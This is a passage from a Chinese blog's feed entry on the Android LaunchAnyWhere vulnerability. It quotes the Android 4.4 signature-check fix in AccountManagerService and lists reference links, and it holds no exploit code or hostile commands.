href="#0x03-修复方案" class="headerlink" title="0x03 修复方案"></a>0x03 修复方案</h3><p>这个漏洞在Android4.4上就被修复了,修复的方式是在b给a返回bundle的时候,检查这个bundle启动的组件的信息签名是不是和b一致.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">2186        @Override</span><br><span class="line">2187        public void onResult(Bundle result) &#123;</span><br><span class="line">2188            mNumResults++;</span><br><span class="line">2189            Intent intent = null;</span><br><span class="line">2190            if (result != null</span><br><span class="line">2191                    &amp;&amp; (intent = result.getParcelable(AccountManager.KEY_INTENT)) != null) &#123;</span><br><span class="line">2192                /*</span><br><span class="line">2193                 * The Authenticator API allows third party authenticators to</span><br><span class="line">2194                 * supply arbitrary intents to other apps that they can run,</span><br><span class="line">2195                 * this can be very bad when those apps are in the system like</span><br><span class="line">2196                 * the System Settings.</span><br><span class="line">2197                 */</span><br><span class="line">2198                int authenticatorUid = Binder.getCallingUid();</span><br><span class="line">2199                long bid = Binder.clearCallingIdentity();</span><br><span class="line">2200                try &#123;</span><br><span class="line">2201                    PackageManager pm = mContext.getPackageManager();</span><br><span class="line">2202                    ResolveInfo resolveInfo = pm.resolveActivityAsUser(intent, 0, mAccounts.userId);</span><br><span class="line">2203                    int targetUid = resolveInfo.activityInfo.applicationInfo.uid;</span><br><span class="line">2204                    if (PackageManager.SIGNATURE_MATCH !=</span><br><span class="line">2205                            pm.checkSignatures(authenticatorUid, targetUid)) &#123;</span><br><span class="line">2206                        throw new SecurityException(</span><br><span class="line">2207                                &quot;Activity to be started with KEY_INTENT must &quot; +</span><br><span class="line">2208                               &quot;share Authenticator&apos;s signatures&quot;);</span><br><span class="line">2209                    &#125;</span><br><span class="line">2210                &#125; finally &#123;</span><br><span class="line">2211                    Binder.restoreCallingIdentity(bid);</span><br><span class="line">2212                &#125;</span><br><span class="line">2213            &#125;</span><br><span class="line">.............................</span><br><span class="line">2264        &#125;</span><br></pre></td></tr></table></figure></p><p><a href="https://github.com/EggUncle/LaunchAnyWhere" target="_blank" rel="noopener">代码</a></p><h3 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h3><p><a href="http://retme.net/index.php/2014/08/20/launchAnyWhere.html" target="_blank" rel="noopener">http://retme.net/index.php/2014/08/20/launchAnyWhere.html</a>  <br><br><a href="http://www.droidsec.cn/bundle%E9%A3%8E%E6%B0%B4-android%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8D%E5%8C%B9%E9%85%8D%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/" target="_blank" rel="noopener">http://www.droidsec.cn/bundle%E9%A3%8E%E6%B0%B4-android%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8D%E5%8C%B9%E9%85%8D%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;LaunchAnyWhere&quot;&gt;&lt;a href=&quot;#LaunchAnyWhere&quot; class=&quot;headerlink&quot; title=&quot;LaunchAnyWhere&quot;&gt;&lt;/a&gt;LaunchAnyWhere&lt;/h1&gt;&lt;p&gt;4.3及以下的一个系统漏洞&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;本文仅供安全技术交流,请勿用于不正当的用途,造成的一切后果与本文作者无关.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;最近看了一点儿系统安全相关的东西,想了解一下java序列化反序列化的东西,正好看到LaunchAnyWhere这个比较经典的漏洞,也尝试了一下,触发机制和原理都比较简单,但是危害也不小.所以这里也顺手记下来.&lt;/p&gt;
&lt;p&gt;再顺带提一下,这个漏洞在Android4.3之后就失效了~&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Android" scheme="http://yoursite.com/tags/Android/"/>
    
  </entry>
  
</feed>
